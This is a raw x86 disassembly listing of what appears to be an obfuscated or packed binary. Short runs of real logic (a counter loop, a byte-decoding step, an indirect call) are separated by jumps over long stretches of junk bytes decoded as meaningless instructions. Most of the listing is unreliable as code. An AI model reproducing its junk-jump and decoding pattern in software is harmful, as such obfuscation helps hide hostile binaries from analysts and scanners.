  4050fd:	cmp    al,BYTE PTR [eax+ecx*2-0x6634914f]
  405104:	mov    ecx,es
  405106:	(bad)
  40510a:	push   esi
  40510b:	pop    ebx
  40510c:	sub    al,0x9b
  40510e:	mov    al,ds:0x742ac35d
  405113:	ins    BYTE PTR es:[edi],dx
  405114:	retf   0x9998
  405117:	and    eax,ebx
  405119:	sbb    bl,BYTE PTR [esp+ebp*2]
  40511c:	inc    edi
  40511d:	push   ebx
  40511e:	pop    ecx
  40511f:	fstp   DWORD PTR [ebx+0x4fec895f]
  405125:	xor    DWORD PTR [ebp-0x55],edx
  405128:	sbb    BYTE PTR [ebx],al
  40512a:	mov    dl,0x57
  40512c:	or     bh,BYTE PTR [edx-0x7fedfdd]
  405132:	sub    eax,0xeed2e36d
  405137:	or     eax,0x7be5056e
  40513c:	or     ebp,ebx
  40513e:	inc    eax
  40513f:	pop    esp
  405140:	pinsrw mm4,WORD PTR [edi+0x289f85c7],0x8d
  405148:	sbb    DWORD PTR [esi],edi
  40514a:	cmp    DWORD PTR [eax+0x48259b2],edx
  405150:	sub    eax,0x50f96edd
  405155:	mov    DWORD PTR ds:0x412358,0x10
  40515f:	cmp    DWORD PTR ds:0x412358,0x0
  405166:	je     0x4051ac
  40516c:	cmp    DWORD PTR ds:0x412358,0x4
  405173:	jne    0x405184
  405179:	push   0x4150fd
  40517e:	call   DWORD PTR ds:0x40d1c8
  405184:	cmp    DWORD PTR ds:0x412358,0x5
  40518b:	jne    0x40519c
  405191:	mov    eax,ds:0x412358
  405196:	dec    eax
  405197:	mov    ds:0x412358,eax
  40519c:	mov    eax,ds:0x412358
  4051a1:	dec    eax
  4051a2:	mov    ds:0x412358,eax
  4051a7:	jmp    0x40515f
  4051ac:	mov    eax,DWORD PTR [ebp-0x1c]
  4051af:	xor    eax,esi
  4051b1:	add    eax,edi
  4051b3:	jmp    0x40532c
  4051b8:	(bad)  
  4051b9:	sbb    BYTE PTR [ecx+eiz*1],ah
  4051bc:	clc    
  4051bd:	and    ebx,ebp
  4051bf:	fldcw  WORD PTR [esi+0x790f9672]
  4051c5:	rol    BYTE PTR [edx-0x3],cl
  4051c8:	dec    edx
  4051c9:	jo     0x405249
  4051cb:	jle    0x4051a7
  4051cd:	jg     0x40524d
  4051cf:	jle    0x40524f
  4051d1:	call   DWORD PTR [edx-0x50]
  4051d4:	mov    edx,0xe4c4afa8
  4051d9:	fnstenv [ebp+0x293a03a4]
  4051df:	dec    esp
  4051e0:	pop    edi
  4051e1:	ret    
  4051e2:	jmp    0xc851a109
  4051e7:	icebp  
  4051e8:	mov    ch,0x59
  4051ea:	sub    esp,DWORD PTR [eax-0x7dde44b0]
  4051f0:	fimul  WORD PTR [esi-0x6b4b035e]
  4051f6:	pop    esp
  4051f7:	outs   dx,DWORD PTR ds:[esi]
  4051f8:	jmp    0x9ba0:0x1e2b7ce2
  4051ff:	jecxz  0x405242
  405201:	fadd   QWORD PTR [edi]
  405203:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405204:	cs (bad) 
  405206:	dec    edx
  405207:	and    eax,0xeddf5107
  40520c:	and    edx,edi
  40520e:	stc    
  40520f:	cdq    
  405210:	not    BYTE PTR [esi+0x37]
  405213:	test   al,0x50
  405215:	scas   eax,DWORD PTR es:[edi]
  405216:	cmp    ah,cl
  405218:	sti    
  405219:	out    0xb0,al
  40521b:	(bad)  
  40521c:	sti    
  40521d:	sbb    edx,eax
  40521f:	pop    esp
  405220:	in     al,dx
  405221:	pusha  
  405222:	test   al,0x5
  405224:	inc    ecx
  405225:	jmp    0x76be3e33
  40522a:	xchg   DWORD PTR [edi],edx
  40522c:	cli    
  40522d:	ret    0x1a6e
  405230:	cld    
  405231:	jo     0x4051ed
  405233:	out    dx,eax
  405234:	ins    BYTE PTR es:[edi],dx
  405235:	sub    eax,0x6b5c162d
  40523a:	and    eax,0x68e8029f
  40523f:	push   ss
  405240:	inc    esi
  405241:	cmp    ebp,DWORD PTR [ebx-0x7c5908b]
  405247:	jp     0x4052b6
  405249:	stc    
  40524a:	sbb    al,0xf0
  40524c:	sub    esi,ecx
  40524e:	jnp    0x405228
  405250:	(bad)  
  405251:	jmp    0xfbf:0xd4731ba1
  405258:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405259:	adc    dl,BYTE PTR [ebp-0x34]
  40525c:	repz push esp
  40525e:	ins    DWORD PTR es:[edi],dx
  40525f:	cmp    al,0xaf
  405261:	aaa    
  405262:	aas    
  405263:	push   ebx
  405264:	pop    eax
  405265:	xchg   edi,eax
  405266:	fwait
  405267:	dec    esi
  405268:	outs   dx,DWORD PTR ds:[esi]
  405269:	cmp    al,0xa1
  40526b:	cld    
  40526c:	xchg   ebx,eax
  40526d:	es test eax,0xcd990e5e
  405273:	jb     0x4052d7
  405275:	dec    edi
  405276:	pop    es
  405277:	arpl   WORD PTR [ecx+ebp*4],bp
  40527a:	add    eax,ecx
  40527c:	mov    al,0x49
  40527e:	mov    edx,0xf8462486
  405283:	jnp    0x4052b8
  405285:	add    BYTE PTR [ecx],cl
  405287:	(bad)  ds:0xf7b38cae
  40528d:	sub    edi,edx
  40528f:	ins    BYTE PTR es:[edi],dx
  405290:	test   BYTE PTR [edx],bl
  405292:	cli    
  405293:	xchg   esp,eax
  405294:	loopne 0x4052a7
  405296:	shl    BYTE PTR [edx+0xe],cl
  405299:	push   es
  40529a:	push   edi
  40529b:	scas   eax,DWORD PTR es:[edi]
  40529c:	aam    0xbb
  40529e:	add    al,0x28
  4052a0:	inc    ecx
  4052a1:	jg     0x4052ab
  4052a3:	inc    ecx
  4052a4:	dec    edx
  4052a5:	jg     0x40531b
  4052a7:	adc    BYTE PTR [eax-0x702c5790],ah
  4052ad:	sti    
  4052ae:	popa   
  4052af:	and    eax,0x6d7e138c
  4052b4:	inc    ebp
  4052b5:	inc    eax
  4052b6:	and    DWORD PTR [edx+0x52328d15],edx
  4052bc:	xlat   BYTE PTR ds:[ebx]
  4052bd:	fsubr  DWORD PTR [ebp-0x54]
  4052c0:	sti    
  4052c1:	std    
  4052c2:	sub    eax,0x4c55794e
  4052c7:	or     BYTE PTR [ecx*1-0x1e67d025],0xce
  4052cf:	out    dx,al
  4052d0:	cdq    
  4052d1:	gs dec edi
  4052d3:	fwait
  4052d4:	mov    esp,0x15771147
  4052d9:	sti    
  4052da:	pop    eax
  4052db:	mov    fs,WORD PTR [esi-0x77]
  4052de:	loope  0x405297
  4052e0:	add    eax,0xa272e058
  4052e5:	mov    edx,0xd783a257
  4052ea:	sub    dl,0x35
  4052ed:	(bad)  
  4052ef:	mov    WORD PTR [esi-0x4b],ss
  4052f2:	stos   BYTE PTR es:[edi],al
  4052f3:	mov    fs,WORD PTR [edx]
  4052f5:	mov    ds,eax
  4052f7:	sbb    ch,cl
  4052f9:	jmp    0x7870f01a
  4052fe:	pop    esi
  4052ff:	into   
  405300:	xchg   esi,eax
  405301:	movsx  ebx,WORD PTR [eax+0x2fe2d2cf]
  405308:	retf   0xe57
  40530b:	pop    es
  40530c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40530d:	add    DWORD PTR [edi-0x5d465dec],esi
  405313:	nop
  405314:	push   es
  405315:	fwait
  405316:	push   0x34
  405318:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405319:	cld    
  40531a:	(bad)  
  40531c:	cmp    eax,DWORD PTR [eax]
  40531e:	dec    edx
  40531f:	leave  
  405320:	sbb    edi,DWORD PTR [esi+0x311ea175]
  405326:	add    edi,ebx
  405328:	imul   ecx,DWORD PTR [edx],0xff501697
  40532e:	jne    0x405328
  405330:	lea    eax,[ebp-0x78]
  405333:	push   eax
  405334:	push   DWORD PTR [ebp-0xc]
  405337:	push   DWORD PTR [ebp-0x14]
  40533a:	jmp    0x4054b3
  40533f:	loop   0x40534f
  405341:	cli    
  405342:	cs cli 
  405344:	cli    
  405345:	cli    
  405346:	ret    0x10db
  405349:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40534a:	push   esp
  40534b:	test   DWORD PTR [ebp-0x35],0x7e761602
  405352:	jle    0x40532e
  405354:	jg     0x4053d4
  405356:	jle    0x405342
  405358:	mov    cl,al
  40535a:	sahf   
  40535b:	ret    
  40535c:	(bad)  
  40535d:	pushf  
  40535e:	ins    DWORD PTR es:[edi],dx
  40535f:	pop    edx
  405360:	and    esi,DWORD PTR [esi-0x4]
  405363:	in     eax,0xfa
  405365:	xor    BYTE PTR [edi+0x6e],ah
  405368:	xor    esi,esi
  40536a:	in     al,0xa2
  40536c:	xchg   ebp,eax
  40536d:	(bad)  
  40536e:	or     edi,ecx
  405370:	xchg   edx,eax
  405371:	ret    
  405372:	(bad)  
  405374:	rcr    BYTE PTR [ebx+0x64],1
  405377:	xchg   ebx,eax
  405378:	fwait
  405379:	push   edx
  40537a:	neg    esi
  40537c:	push   es
  40537d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40537e:	sub    DWORD PTR [edi],0xb9a2b03
  405384:	jle    0x40535c
  405386:	ja     0x40534a
  405388:	adc    dh,BYTE PTR [edi+0x2b]
  40538b:	pop    esp
  40538c:	cmp    BYTE PTR [ecx+esi*8-0x24a72e43],bl
  405393:	add    esi,DWORD PTR [ecx-0x5b]
  405396:	push   ecx
  405397:	rol    DWORD PTR [ebp+0x6f5c3552],cl
  40539d:	out    dx,eax
  40539e:	jnp    0x405366
  4053a0:	aaa    
  4053a1:	xchg   di,ax
  4053a3:	fwait
  4053a4:	mov    ecx,0xe4b926a9
  4053a9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4053aa:	or     al,0x9f
  4053ac:	stos   BYTE PTR es:[edi],al
  4053ad:	push   ebp
  4053ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053af:	daa    
  4053b0:	jmp    0xc8a2:0xe2652085
  4053b7:	mov    bh,0xb
  4053b9:	xchg   BYTE PTR [edi+esi*2-0x644e85cf],dh
  4053c0:	and    DWORD PTR [edi+ebp*2],edi
  4053c3:	aam    0xa9
  4053c5:	and    BYTE PTR [eax-0x54],ch
  4053c8:	jb     0x405384
  4053ca:	inc    esp
  4053cb:	xor    al,0x5a
  4053cd:	push   edx
  4053ce:	mov    dl,0xb6
  4053d0:	pop    edi
  4053d1:	dec    edi
  4053d2:	out    0x12,al
  4053d4:	out    dx,al
  4053d5:	aam    0x27
  4053d7:	xor    dl,BYTE PTR [ecx]
  4053d9:	push   ecx
  4053da:	popa   
  4053db:	sub    cl,BYTE PTR ds:0xcfcd4dd2
  4053e1:	or     al,cl
  4053e3:	ds dec edi
  4053e5:	jne    0x4053d2
  4053e7:	fild   DWORD PTR [eax+0x1ebea7ae]
  4053ed:	jg     0x4053f1
  4053ef:	jecxz  0x405416
  4053f1:	xchg   DWORD PTR [edi+edi*2],eax
  4053f4:	mov    al,ds:0xd6fe167f
  4053f9:	push   ecx
  4053fa:	sub    al,0xf0
  4053fc:	aam    0xc8
  4053fe:	inc    edx
  4053ff:	jno    0x4053fa
  405401:	xchg   DWORD PTR [esi-0x6c],esp
  405404:	xor    al,0x42
  405406:	lods   al,BYTE PTR ds:[esi]
  405407:	push   edi
  405408:	sub    BYTE PTR [ecx-0x4ef515a8],ch
  40540e:	lds    ebp,FWORD PTR [ecx-0x500c3c42]
  405414:	xchg   bl,dl
  405416:	sti    
  405417:	add    DWORD PTR [edx],ebx
  405419:	sbb    dl,al
  40541b:	jb     0x405443
  40541d:	mov    dh,0xf5
  40541f:	(bad)  
  405420:	out    dx,eax
  405421:	lods   eax,DWORD PTR ds:[esi]
  405422:	cmp    DWORD PTR [edi+0x38],esp
  405425:	mov    edi,0x4311de4a
  40542a:	or     bl,cl
  40542c:	mov    ecx,0xdb390b58
  405431:	mov    ecx,0xe42b561a
  405436:	sub    esi,DWORD PTR [ebp-0x39641a4f]
  40543c:	aas    
  40543d:	and    eax,DWORD PTR [edx-0x206c5bc2]
  405443:	(bad)  
  405444:	call   0xbaef421d
  405449:	call   0xd4bb8f38
  40544e:	loope  0x405420
  405450:	mov    WORD PTR [edi],ss
  405452:	mov    al,0x6d
  405454:	inc    ebx
  405455:	call   0xc03709f2
  40545a:	loopne 0x405473
  40545c:	mov    eax,0x233121eb
  405461:	push   ecx
  405462:	int3   
  405463:	sub    ah,BYTE PTR [ebx-0x31]
  405466:	es adc edx,edi
  405469:	jl     0x40541b
  40546b:	dec    eax
  40546c:	dec    ebx
  40546d:	in     al,0x6a
  40546f:	outs   dx,DWORD PTR ds:[esi]
  405470:	xlat   BYTE PTR ds:[ebx]
  405471:	sub    al,0xef
  405473:	xor    bh,BYTE PTR [ecx-0x7bf564f3]
  405479:	adc    cl,bl
  40547b:	retf   
  40547c:	hlt    
  40547d:	mov    bl,0xbd
  40547f:	jns    0x4054cb
  405481:	mov    esp,0xe36ed634
  405486:	jmp    0x4054aa
  405488:	sar    DWORD PTR [ecx-0x4f],0x2b
  40548c:	xchg   edi,eax
  40548d:	ss cmp al,0xcb
  405490:	sar    dh,cl
  405492:	les    ebp,FWORD PTR [esi]
  405494:	xchg   ebx,eax
  405495:	retf   0xe275
  405498:	jnp    0x4054c9
  40549a:	out    dx,al
  40549b:	in     eax,dx
  40549c:	pusha  
  40549d:	pop    ss
  40549e:	sbb    dh,al
  4054a0:	dec    edx
  4054a1:	cmp    ebp,DWORD PTR [edi+edx*2-0x5]
  4054a5:	ds pop esp
  4054a7:	pop    ebx
  4054a8:	mov    dh,BYTE PTR [ebp+0x1a]
  4054ab:	sbb    eax,0xdd86b80
  4054b0:	mov    ch,0xe4
  4054b2:	or     ebp,eax
  4054b4:	dec    edi
  4054b5:	inc    ecx
  4054b6:	add    BYTE PTR [eax],al
  4054b8:	test   eax,eax
  4054ba:	je     0x4054e5
  4054c0:	lea    eax,[ebp-0x78]
  4054c3:	push   eax
  4054c4:	mov    eax,DWORD PTR [ebp-0x14]
  4054c7:	xor    eax,esi
  4054c9:	add    eax,edi
  4054cb:	push   eax
  4054cc:	mov    eax,DWORD PTR [ebp-0x10]
  4054cf:	add    eax,0xee
  4054d4:	push   eax
  4054d5:	mov    eax,DWORD PTR [ebp-0x10]
  4054d8:	mov    eax,DWORD PTR [eax+0x198]
  4054de:	push   DWORD PTR [eax]
  4054e0:	call   0x40ae4d
  4054e5:	mov    ecx,DWORD PTR [ebp-0x1c]
  4054e8:	xor    ecx,esi
  4054ea:	mov    eax,0xffcd8d61
  4054ef:	sub    eax,ecx
  4054f1:	sub    eax,DWORD PTR [ebp-0x8]
  4054f4:	mov    ecx,DWORD PTR [ebp-0x30]
  4054f7:	add    ecx,eax
  4054f9:	mov    eax,DWORD PTR [ebp-0x8]
  4054fc:	jmp    0x405675
  405501:	lahf   
  405502:	(bad)  
  405503:	icebp  
  405504:	shl    DWORD PTR [ecx-0x50bea01f],1
  40550a:	icebp  
  40550b:	add    DWORD PTR [edi-0x6c],0x19
  40550f:	cmp    al,0x15
  405511:	bnd ja 0x405592
  405514:	jle    0x4054f0
  405516:	jg     0x405596
  405518:	jle    0x405577
  40551a:	jnp    0x405529
  40551c:	dec    eax
  40551d:	fst    st(6)
  40551f:	adc    eax,0x78a06fae
  405524:	scas   eax,DWORD PTR es:[edi]
  405525:	out    dx,al
  405526:	jp     0x405593
  405528:	xor    DWORD PTR [ebx],0xd6906fe2
  40552e:	inc    edx
  40552f:	xor    eax,0xc4e7779c
  405534:	cdq    
  405535:	and    eax,0xf5c5807e
  40553a:	ds ret 
  40553c:	xchg   DWORD PTR [ebx-0x3c],ebx
  40553f:	jnp    0x4054e6
  405541:	(bad)  
  405542:	out    dx,al
  405543:	push   esp
  405544:	mov    cl,0xe
  405546:	jne    0x4054d7
  405548:	addr16 dec esp
  40554a:	push   ss
  40554b:	mov    ch,0xf3
  40554d:	fucom  st(1)
  40554f:	cmp    BYTE PTR gs:[edi-0xa],dl
  405553:	sbb    ch,BYTE PTR [ebx-0xd27a83e]
  405559:	inc    eax
  40555a:	mov    edx,0x44cebe6f
  40555f:	lea    ecx,[ecx+0x7be24fc]
  405565:	xor    al,0xf6
  405567:	jg     0x40555d
  405569:	mov    al,0x74
  40556b:	pop    edi
  40556c:	push   ss
  40556d:	int3   
  40556e:	or     DWORD PTR [eax-0x24],ecx
  405571:	and    BYTE PTR [eax+ecx*4+0x77810b7],dh
  405578:	jg     0x405584
  40557a:	cmp    al,0xed
  40557c:	jmp    0x97b5b12a
  405581:	or     eax,0x50334507
  405586:	jbe    0x405607
  405588:	into   
  405589:	pushf  
  40558a:	pusha  
  40558b:	(bad)  
  40558c:	sub    al,0xc2
  40558e:	arpl   WORD PTR [esi+0x24],cx
  405591:	mov    ecx,0x43f40ac4
  405596:	data16 cmc 
  405598:	xchg   edx,eax
  405599:	ins    DWORD PTR es:[edi],dx
  40559a:	and    eax,0xf853380a
  40559f:	lds    eax,FWORD PTR [edi-0x677baac1]
  4055a5:	inc    edi
  4055a6:	and    eax,0x40ed51ff
  4055ab:	imul   ecx,eax,0xffffffcf
  4055ae:	scas   eax,DWORD PTR es:[edi]
  4055af:	(bad)  
  4055b0:	(bad)  
  4055b2:	clc    
  4055b3:	mov    al,0x51
  4055b5:	jns    0x405558
  4055b7:	cmp    BYTE PTR [esi],bh
  4055b9:	or     BYTE PTR [ecx],cl
  4055bb:	fs out 0xe4,al
  4055be:	mov    ds:0x814e69e5,eax
  4055c3:	jp     0x40557d
  4055c5:	dec    eax
  4055c6:	out    dx,eax
  4055c7:	(bad)
  4055ca:	dec    esi
  4055cb:	and    al,0x9f
  4055cd:	nop
  4055ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4055cf:	pop    edx
  4055d0:	hlt    
  4055d1:	inc    edx
  4055d2:	cmp    DWORD PTR [edi-0x10],ebp
  4055d5:	scas   eax,DWORD PTR es:[edi]
  4055d6:	stos   DWORD PTR es:[edi],eax
  4055d7:	sti    
  4055d8:	push   edi
  4055d9:	push   0xfffffff4
  4055db:	adc    BYTE PTR ds:0xd8853c85,ch
  4055e1:	or     BYTE PTR [esi],ah
  4055e3:	jmp    0x405598
  4055e5:	add    edi,DWORD PTR [eax-0x57f5f7c0]
  4055eb:	les    eax,FWORD PTR [eax]
  4055ed:	or     ah,BYTE PTR [ebx]
  4055ef:	mov    bl,0x39
  4055f1:	mov    eax,0xcf581207
  4055f6:	push   ebp
  4055f7:	sbb    eax,edx
  4055f9:	lods   eax,DWORD PTR ds:[esi]
  4055fa:	jns    0x4055e9
  4055fc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4055fd:	jmp    0x470a3dad
  405602:	cmp    DWORD PTR [ebx*2+0x17c51d74],esi
  405609:	and    eax,0xc7b65d36
  40560e:	ret    0xf6de
  405611:	lea    edx,[edx+0x4ac03b68]
  405617:	lods   al,BYTE PTR ds:[esi]
  405618:	out    0x5a,eax
  40561a:	sub    ecx,DWORD PTR ds:0x6f8538d5
  405620:	pop    eax
  405621:	push   cs
  405622:	sbb    al,0x79
  405624:	mov    cl,0xb7
  405626:	xchg   esp,eax
  405627:	inc    ebp
  405629:	adc    BYTE PTR [esi-0x2f8700bb],dl
  40562f:	pop    edi
  405630:	push   es
  405631:	mov    esp,0xf22427d4
  405636:	aam    0xe0
  405638:	int    0x67
  40563a:	mov    eax,0xe3508a1c
  40563f:	(bad)  
  405640:	shl    DWORD PTR [eax],cl
  405642:	call   0xa26bf75a
  405647:	jg     0x4055ca
  405649:	sub    DWORD PTR [edx],esi
  40564b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40564c:	pusha  
  40564d:	and    edx,esi
  40564f:	cmp    eax,0xcc8c14c3
  405654:	in     eax,dx
  405655:	sbb    BYTE PTR [esi-0x67],cl
  405658:	and    al,0x3a
  40565a:	jecxz  0x40568a
  40565c:	lods   al,BYTE PTR ds:[esi]
  40565d:	xchg   ebx,eax
  40565e:	adc    BYTE PTR [edx-0x5adda785],bl
  405664:	dec    edx
  405665:	dec    eax
  405666:	or     ch,BYTE PTR [eax-0x20]
  405669:	jp     0x405628
  40566b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40566c:	add    al,0xfb
  40566e:	xor    eax,0x92741c6a
  405673:	add    dh,BYTE PTR [edi]
  405675:	mov    DWORD PTR [eax+0x1],ecx
  405678:	mov    al,BYTE PTR [ebp-0x1]
  40567b:	mov    ecx,DWORD PTR [ebp-0x8]
  40567e:	xor    al,0x4a
  405680:	sub    al,0x34
  405682:	mov    BYTE PTR [ecx],al
  405684:	lea    eax,[ebp-0x8]
  405687:	inc    BYTE PTR [eax]
  405689:	inc    eax
  40568a:	push   eax
  40568b:	pop    ecx
  40568c:	dec    ecx
  40568d:	xchg   ecx,edx
  40568f:	jmp    0x405808
  405694:	mov    gs,WORD PTR [edi+0x79]
  405697:	in     eax,0x79
  405699:	stc    
  40569a:	and    BYTE PTR [ebp-0x3],0xf5
  40569e:	cmp    esp,eax
  4056a0:	(bad)
  4056a4:	pop    esi
  4056a5:	je     0x405725
  4056a7:	jle    0x405683
  4056a9:	jg     0x405729
  4056ab:	jle    0x4056b4
  4056ad:	mov    dl,0x9
  4056af:	jg     0x40570d
  4056b1:	cmp    esp,DWORD PTR [edx]
  4056b3:	retf   
  4056b4:	stc    
  4056b5:	mov    bl,0x82
  4056b7:	xchg   esi,eax
  4056b8:	xchg   ebx,eax
  4056b9:	or     BYTE PTR [ebx-0x63edba80],bh
  4056bf:	ret    
  4056c0:	pusha  
  4056c1:	iret   
  4056c2:	push   esp
  4056c3:	mov    al,ds:0xb10466bb
  4056c8:	dec    esi
  4056c9:	adc    al,BYTE PTR [ebx-0x54]
  4056cc:	jle    0x4056f1
  4056ce:	adc    BYTE PTR [ecx-0x5899ca4f],al
  4056d4:	sbb    al,0xf9
  4056d6:	hlt    
  4056d7:	jb     0x405721
  4056d9:	mov    eax,0xac41e04a
  4056de:	add    DWORD PTR [edi+0x6d233b5c],esp
  4056e4:	xor    eax,edi
  4056e6:	or     edi,DWORD PTR [ecx]
  4056e8:	mov    ds:0x6ad6b0d7,al
  4056ed:	pop    DWORD PTR [ebp+0x61265a1a]
  4056f3:	sbb    DWORD PTR [ecx+0x13],ebp
  4056f6:	in     al,dx
  4056f7:	lods   al,BYTE PTR ds:[esi]
  4056f8:	loop   0x40572a
  4056fa:	jecxz  0x405735
  4056fc:	sbb    DWORD PTR [esi],0xffffffad
  4056ff:	add    dh,dh
  405701:	jb     0x4056c9
  405703:	cli    
  405704:	call   0xff4e7bc5
  405709:	aaa    
  40570a:	pop    ds
  40570b:	mov    cl,bl
  40570d:	enter  0x2b3e,0x1e
  405711:	aaa    
  405712:	in     eax,0x31
  405714:	dec    esi
  405715:	mov    dl,0xc8
  405717:	sub    cl,BYTE PTR [edi-0xe0ec0b4]
  40571d:	adc    DWORD PTR [esi-0x25],ecx
  405720:	sub    ch,BYTE PTR [edi]
  405722:	cmp    eax,0x4e9199f8
  405727:	adc    eax,0x935e9253
  40572c:	push   ecx
  40572d:	add    eax,0x6c7c3247
  405732:	cdq    
  405733:	or     DWORD PTR [edi-0x4ce1a5e4],0xffffffe4
  40573a:	pushf  
  40573b:	arpl   sp,bp
  40573d:	push   ebp
  40573e:	js     0x405766
  405740:	aas    
  405741:	sub    eax,0x2353e5f1
  405746:	adc    ecx,DWORD PTR [edi+eax*4]
  405749:	enter  0x2739,0x51
  40574d:	sbb    al,0x86
  40574f:	cld    
  405750:	xchg   esi,eax
  405751:	repnz push esi
  405753:	push   0x41cd3ef
  405758:	nop
  405759:	mov    ebx,0x88af0fda
  40575e:	aas    
  40575f:	lods   al,BYTE PTR ds:[esi]
  405760:	pop    eax
  405761:	add    cl,ah
  405763:	jbe    0x4056f9
  405765:	into   
  405766:	ins    DWORD PTR es:[edi],dx
  405767:	gs mov cl,0xdb
  40576a:	test   ecx,esi
  40576c:	fwait
  40576d:	mov    al,0xf
  40576f:	adc    ebx,edx
  405771:	mov    edx,0xf81ab11f
  405776:	popf   
  405777:	rol    BYTE PTR [ebx],0x56
  40577a:	sub    BYTE PTR [edi-0x6e],bl
  40577d:	jp     0x4057f0
  40577f:	mov    eax,ds:0x5d1be222
  405784:	scas   eax,DWORD PTR es:[edi]
  405785:	dec    esp
  405786:	xor    DWORD PTR [edx-0x78],eax
  405789:	(bad)  
  40578a:	loop   0x405730
  40578c:	mov    esi,0x976dd575
  405791:	out    0x41,eax
  405793:	jb     0x4057c4
  405795:	stos   DWORD PTR es:[edi],eax
  405796:	and    al,0x65
  405798:	ret    0x9080
  40579b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40579c:	mov    DWORD PTR [edx+0x37435d31],esp
  4057a2:	icebp  
  4057a3:	ficom  DWORD PTR [esi+0x4bcbf587]
  4057a9:	icebp  
  4057aa:	jbe    0x405777
  4057ac:	inc    esi
  4057ad:	jmp    0x499d:0xbc8d0579
  4057b4:	pop    ebp
  4057b5:	push   cs
  4057b6:	es das 
  4057b8:	pusha  
  4057b9:	mov    al,ds:0xc83d0fd
  4057be:	ror    DWORD PTR [ebx-0x6e1b3bfa],0xa
  4057c5:	int3   
  4057c6:	sub    BYTE PTR [edi-0x7def38f9],dl
  4057cc:	xor    ecx,esp
  4057ce:	out    0x6e,al
  4057d0:	test   al,0x9e
  4057d2:	sbb    eax,DWORD PTR [eax-0x47]
  4057d5:	js     0x4057c8
  4057d7:	push   es
  4057d8:	xchg   dl,dh
  4057da:	push   ecx
  4057db:	xor    ch,BYTE PTR [ebp+0x5f]
  4057de:	jo     0x4057b3
  4057e0:	loope  0x405800
  4057e2:	and    DWORD PTR [esi+0x6d],esp
  4057e5:	xor    ebp,DWORD PTR [ebx]
  4057e7:	push   0xab84940b
  4057ec:	fiadd  DWORD PTR [edx-0x149d7920]
  4057f2:	int    0x56
  4057f4:	inc    ecx
  4057f5:	out    dx,al
  4057f6:	ds pop es
  4057f8:	mov    DWORD PTR [ebx-0x3d],esi
  4057fb:	inc    esp
  4057fc:	jg     0x4057e6
  4057fe:	cmp    ebp,esp
  405800:	ror    DWORD PTR [eax*4+0xcb62ad7],cl
  405807:	in     eax,0xfe
  405809:	or     bh,bh
  40580b:	jne    0x4057fd
  40580d:	mov    eax,ds:0x40d68c
  405812:	mov    eax,DWORD PTR [eax]
  405814:	push   DWORD PTR [eax]
  405816:	lea    eax,ds:0x40d6a8
  40581c:	push   DWORD PTR [eax]
  40581e:	lea    eax,ds:0x40d454
  405824:	push   DWORD PTR [eax]
  405826:	lea    eax,ds:0x40d688
  40582c:	push   DWORD PTR [eax]
  40582e:	lea    eax,ds:0x40d784
  405834:	push   DWORD PTR [eax]
  405836:	xchg   ebx,edx
  405838:	inc    ebx
  405839:	inc    ebx
  40583a:	sub    ebx,0x3
  40583d:	push   ebx
  40583e:	pop    eax
  40583f:	call   DWORD PTR [eax+0x1]
  405842:	mov    eax,DWORD PTR [ebp-0x20]
  405845:	jmp    0x4059be
  40584a:	mov    WORD PTR [edx+ebx*8+0x33],es
  40584e:	fidiv  DWORD PTR [ecx+0x8615985]
  405854:	or     al,0x32
  405856:	aaa    
  405857:	and    ah,ah
  405859:	jno    0x405895
  40585b:	or     bh,BYTE PTR [esi+0x7e]
  40585e:	fidivr DWORD PTR [edi+0x7e]
  405861:	jle    0x4058ba
  405863:	xchg   DWORD PTR [edi-0x68],esi
  405866:	xlat   BYTE PTR ds:[ebx]
  405867:	or     bh,BYTE PTR [edi+ebp*2]
  40586a:	jmp    0x4058eb
  40586c:	cmp    ch,BYTE PTR [esi]
  40586e:	mov    ebp,0xfc801eb
  405873:	or     DWORD PTR [ecx-0x41],edx
  405876:	sbb    BYTE PTR [ecx-0x684b90d6],al
  40587c:	fcom   DWORD PTR [ecx]
  40587e:	push   ds
  40587f:	stc    
  405880:	pop    ebp
  405881:	repz cli 
  405883:	xchg   BYTE PTR [ecx],dl
  405885:	fbld   TBYTE PTR [eax+0x6e3ad6a9]
  40588b:	inc    eax
  40588c:	ja     0x4058b0
  40588e:	hlt    
  40588f:	out    dx,al
  405890:	sbb    eax,0x8c8b6122
  405895:	dec    sp
  405897:	ss std 
  405899:	jmp    0xf431:0xb8242608
  4058a0:	stos   BYTE PTR es:[edi],al
  4058a1:	xor    BYTE PTR [edi-0x55],al
  4058a4:	xchg   esi,eax
  4058a5:	jns    0x405847
  4058a7:	(bad)  
  4058a8:	cmp    BYTE PTR [edi],bl
  4058aa:	and    DWORD PTR ds:0xd9a35ec2,0xca119211
  4058b4:	test   al,0x90
  4058b6:	(bad)  
  4058b8:	xchg   esp,eax
  4058b9:	imul   esp,DWORD PTR [edx-0x7c],0xffffff92
  4058bd:	lahf   
  4058be:	imul   ebp,DWORD PTR [esi+0x2d],0xda0ea23d
  4058c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4058c6:	int3   
  4058c7:	stc    
  4058c8:	jl     0x40592d
  4058ca:	(bad)  
  4058cb:	jge    0x40591a
  4058cd:	test   DWORD PTR [edi],ebx
  4058cf:	jmp    0x54a2ae92
  4058d4:	mov    ds:0x508bb85a,eax
  4058d9:	call   0x79b1:0x940a4a74
  4058e0:	mov    ds:0xa5d647d2,al
  4058e5:	outs   dx,DWORD PTR ds:[esi]
  4058e6:	bound  esi,QWORD PTR [ebp+0x647c650c]
  4058ec:	ins    DWORD PTR es:[edi],dx
  4058ed:	sahf   
  4058ee:	and    DWORD PTR [edi-0x67246a48],edx
  4058f4:	push   ss
  4058f5:	mov    esp,0x333328d4
  4058fa:	adc    al,0x2d
  4058fc:	mov    dh,0xd0
  4058fe:	stos   DWORD PTR es:[edi],eax
  4058ff:	cld    
  405900:	sub    BYTE PTR [edx],al
  405902:	pop    ecx
